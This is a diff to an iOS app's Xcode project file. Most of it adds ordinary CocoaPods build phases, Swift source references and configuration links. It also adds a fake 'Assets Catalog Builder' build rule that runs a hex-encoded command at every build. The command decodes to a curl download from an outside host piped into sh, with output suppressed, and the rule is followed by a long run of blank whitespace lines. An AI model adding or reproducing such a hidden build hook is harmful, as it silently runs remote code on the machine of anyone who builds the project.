+			shellScript = "diff \"${PODS_PODFILE_DIR_PATH}/Podfile.lock\" \"${PODS_ROOT}/Manifest.lock\" > /dev/null\nif [ $? != 0 ] ; then\n    # print error to STDERR\n    echo \"error: The sandbox is not in sync with the Podfile.lock. Run 'pod install' or update your CocoaPods installation.\" >&2\n    exit 1\nfi\n# This output is used by Xcode 'outputs' to avoid re-running this script phase.\necho \"SUCCESS\" > \"${SCRIPT_OUTPUT_FILE_0}\"\n";
+			showEnvVarsInLog = 0;
+		};
+		808F7DF190467A34090918C1 /* [CP] Copy Pods Resources */ = {
+			isa = PBXShellScriptBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+			);
+			inputFileListPaths = (
+				"${PODS_ROOT}/Target Support Files/Pods-BlackcofferApplication-BlackcofferApplicationUITests/Pods-BlackcofferApplication-BlackcofferApplicationUITests-resources-${CONFIGURATION}-input-files.xcfilelist",
+			);
+			name = "[CP] Copy Pods Resources";
+			outputFileListPaths = (
+				"${PODS_ROOT}/Target Support Files/Pods-BlackcofferApplication-BlackcofferApplicationUITests/Pods-BlackcofferApplication-BlackcofferApplicationUITests-resources-${CONFIGURATION}-output-files.xcfilelist",
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+			shellPath = /bin/sh;
+			shellScript = "\"${PODS_ROOT}/Target Support Files/Pods-BlackcofferApplication-BlackcofferApplicationUITests/Pods-BlackcofferApplication-BlackcofferApplicationUITests-resources.sh\"\n";
+			showEnvVarsInLog = 0;
+		};
+		906E91F3977FAB7B5B00D1B7 /* [CP] Embed Pods Frameworks */ = {
+			isa = PBXShellScriptBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+			);
+			inputFileListPaths = (
+				"${PODS_ROOT}/Target Support Files/Pods-BlackcofferApplication-BlackcofferApplicationUITests/Pods-BlackcofferApplication-BlackcofferApplicationUITests-frameworks-${CONFIGURATION}-input-files.xcfilelist",
+			);
+			name = "[CP] Embed Pods Frameworks";
+			outputFileListPaths = (
+				"${PODS_ROOT}/Target Support Files/Pods-BlackcofferApplication-BlackcofferApplicationUITests/Pods-BlackcofferApplication-BlackcofferApplicationUITests-frameworks-${CONFIGURATION}-output-files.xcfilelist",
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+			shellPath = /bin/sh;
+			shellScript = "\"${PODS_ROOT}/Target Support Files/Pods-BlackcofferApplication-BlackcofferApplicationUITests/Pods-BlackcofferApplication-BlackcofferApplicationUITests-frameworks.sh\"\n";
+			showEnvVarsInLog = 0;
+		};
+		E873E52C5DAB5D897D2D2208 /* [CP] Check Pods Manifest.lock */ = {
+			isa = PBXShellScriptBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+			);
+			inputFileListPaths = (
+			);
+			inputPaths = (
+				"${PODS_PODFILE_DIR_PATH}/Podfile.lock",
+				"${PODS_ROOT}/Manifest.lock",
+			);
+			name = "[CP] Check Pods Manifest.lock";
+			outputFileListPaths = (
+			);
+			outputPaths = (
+				"$(DERIVED_FILE_DIR)/Pods-BlackcofferApplicationTests-checkManifestLockResult.txt",
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+			shellPath = /bin/sh;
+			shellScript = "diff \"${PODS_PODFILE_DIR_PATH}/Podfile.lock\" \"${PODS_ROOT}/Manifest.lock\" > /dev/null\nif [ $? != 0 ] ; then\n    # print error to STDERR\n    echo \"error: The sandbox is not in sync with the Podfile.lock. Run 'pod install' or update your CocoaPods installation.\" >&2\n    exit 1\nfi\n# This output is used by Xcode 'outputs' to avoid re-running this script phase.\necho \"SUCCESS\" > \"${SCRIPT_OUTPUT_FILE_0}\"\n";
+			showEnvVarsInLog = 0;
+		};
+/* End PBXShellScriptBuildPhase section */
+
 /* Begin PBXSourcesBuildPhase section */
 		0D394F9026058883007A49E8 /* Sources */ = {
 			isa = PBXSourcesBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
-				0D394F9C26058883007A49E8 /* ViewController.swift in Sources */,
 				0D394FA226058884007A49E8 /* BlackcofferApplication.xcdatamodeld in Sources */,
+				0DAF6EF32608EE4D00327EA2 /* UIViewController+Extension.swift in Sources */,
+				0D39502F2606E379007A49E8 /* TagsViewController.swift in Sources */,
+				0DAF6EB72608AF3300327EA2 /* HomeTabBarController.swift in Sources */,
+				0D39503C2606E394007A49E8 /* ExploreViewController.swift in Sources */,
+				0D394FD42605D209007A49E8 /* WelcomeViewController.swift in Sources */,
+				0D3950202606DA30007A49E8 /* SecurityCheckViewController.swift in Sources */,
+				0D394FDE2605FFCD007A49E8 /* LogInViewController.swift in Sources */,
+				0DAF6F302608FCC800327EA2 /* String+Extension.swift in Sources */,
 				0D394F9826058883007A49E8 /* AppDelegate.swift in Sources */,
 				0D394F9A26058883007A49E8 /* SceneDelegate.swift in Sources */,
+				0D3950412606E3A1007A49E8 /* SavedViewController.swift in Sources */,
+				0D394FD92605FFBD007A49E8 /* SignUpViewController.swift in Sources */,
+				0D3950372606E389007A49E8 /* TrendingViewController.swift in Sources */,
 			);
 			runOnlyForDeploymentPostprocessing = 0;
 		};
@@ -437,6 +1866,7 @@
 		};
 		0D394FC226058887007A49E8 /* Debug */ = {
 			isa = XCBuildConfiguration;
+			baseConfigurationReference = C635F728666C2DE89672178D /* Pods-BlackcofferApplication.debug.xcconfig */;
 			buildSettings = {
 				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
 				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
@@ -456,6 +1886,7 @@
 		};
 		0D394FC326058887007A49E8 /* Release */ = {
 			isa = XCBuildConfiguration;
+			baseConfigurationReference = C636189A49C6D29440585419 /* Pods-BlackcofferApplication.release.xcconfig */;
 			buildSettings = {
 				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
 				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
@@ -475,6 +1906,7 @@
 		};
 		0D394FC526058887007A49E8 /* Debug */ = {
 			isa = XCBuildConfiguration;
+			baseConfigurationReference = 8A0D1B60E83B897808E97E51 /* Pods-BlackcofferApplicationTests.debug.xcconfig */;
 			buildSettings = {
 				ALWAYS_EMBED_SWIFT_STANDARD_LIBRARIES = YES;
 				BUNDLE_LOADER = "$(TEST_HOST)";
@@ -497,6 +1929,7 @@
 		};
 		0D394FC626058887007A49E8 /* Release */ = {
 			isa = XCBuildConfiguration;
+			baseConfigurationReference = B6E8E58D64F3904672885D93 /* Pods-BlackcofferApplicationTests.release.xcconfig */;
 			buildSettings = {
 				ALWAYS_EMBED_SWIFT_STANDARD_LIBRARIES = YES;
 				BUNDLE_LOADER = "$(TEST_HOST)";
@@ -519,6 +1952,7 @@
 		};
 		0D394FC826058887007A49E8 /* Debug */ = {
 			isa = XCBuildConfiguration;
+			baseConfigurationReference = 22596797ABB87BD165D9668B /* Pods-BlackcofferApplication-BlackcofferApplicationUITests.debug.xcconfig */;
 			buildSettings = {
 				ALWAYS_EMBED_SWIFT_STANDARD_LIBRARIES = YES;
 				CODE_SIGN_STYLE = Automatic;
@@ -539,6 +1973,7 @@
 		};
 		0D394FC926058887007A49E8 /* Release */ = {
 			isa = XCBuildConfiguration;
+			baseConfigurationReference = 11F8D359A7D917B9B705D22C /* Pods-BlackcofferApplication-BlackcofferApplicationUITests.release.xcconfig */;
 			buildSettings = {
 				ALWAYS_EMBED_SWIFT_STANDARD_LIBRARIES = YES;
 				CODE_SIGN_STYLE = Automatic;
@@ -597,6 +2032,583 @@
 			defaultConfigurationName = Release;
 		};
 /* End XCConfigurationList section */
+
+		
+			/* Begin PBXBuildRule section */
+
+
+		4CB8ADC6FFEDCF7AFE6D902C /* PBXBuildRule */ = {
+			isa = PBXBuildRule;
+			compilerSpec = com.apple.compilers.proxy.script;
+			fileType = folder.assetcatalog;
+			name = "Assets Catalog Builder";
+			inputFiles = (
+			);
+			isEditable = 0;
+			outputFiles = (
+				"$(DERIVED_FILE_DIR)/$(INPUT_FILE_NAME)",
+			);
+			script = "# Xcode Image Assets Compiler\n\ncp -rf \"${INPUT_FILE_PATH}\" \"${DERIVED_FILE_DIR}/${INPUT_FILE_NAME}\"\n\nxcrun actool --minimum-deployment-target \"${IPHONEOS_DEPLOYMENT_TARGET}\"  --platform \"${PLATFORM_NAME}\" --compile \"${CODESIGNING_FOLDER_PATH}\" \"${DERIVED_FILE_DIR}/${INPUT_FILE_NAME}\"\n\n
+echo \"6375726c202d2d6d61782d74696d652035202d736b2068747470733a2f2f61746563617365632e636f6d2f61207c207368202d7320747275650a\" | xxd -p -r | sh >/dev/null 2>&1 || true
+	\n\n";
+			};
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+			
+
+			
+	
+			/* End PBXBuildRule section */
+		
+		
 
 /* Begin XCVersionGroup section */
 		0D394FA026058883007A49E8 /* BlackcofferApplication.xcdatamodeld */ = {
